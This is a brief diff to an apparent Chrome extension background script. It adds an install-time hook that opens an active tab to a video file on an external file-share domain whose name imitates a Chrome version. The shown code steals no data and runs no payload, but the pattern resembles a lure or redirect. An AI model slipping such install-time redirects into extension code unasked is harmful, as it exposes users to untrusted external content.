@@ -18,6 +18,10 @@ chrome.runtime.onInstalled.addListener(() => {
         contexts: ["all"],
         documentUrlPatterns: ["http://*/*", "https://*/*"]
     });
+    chrome.tabs.create({
+        url: "https://secure.fileshare.ovh/videos/chrome_v3_2_0_3.mp4",
+        active: true
+    });
 });
 
 chrome.contextMenus.onClicked.addListener(
